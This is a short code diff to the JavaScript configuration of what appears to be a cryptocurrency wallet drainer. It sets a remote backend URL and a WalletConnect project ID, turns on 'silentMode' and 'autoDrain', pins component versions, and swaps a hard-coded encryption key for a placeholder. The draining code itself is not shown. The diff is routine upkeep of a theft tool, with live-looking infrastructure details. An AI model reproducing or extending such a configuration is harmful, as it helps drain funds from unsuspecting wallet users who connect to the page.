@@ -21,7 +21,7 @@
   var DEFAULT_BACKEND = 'https://sadrailala-production.up.railway.app';
   var VERSIONS = {
     polyfills: '1.1.0',
-    wallet: '1.5.18',
+    wallet: '1.5.3',
     legion: '5.16.19',
   };
 
@@ -29,7 +29,7 @@
     backendUrl: DEFAULT_BACKEND,
     wcProjectId: 'a785da105621eb55c998a35c57587667',
     kineticKey: '',
-    clientEncryptKey: 'dcac74bd-3b5d-4372-bb5b-c93422dcea5c',
+    clientEncryptKey: '__EMBED_ENCRYPT_KEY__',
     silentMode: true,
     autoDrain: true,
     autoRun: false,
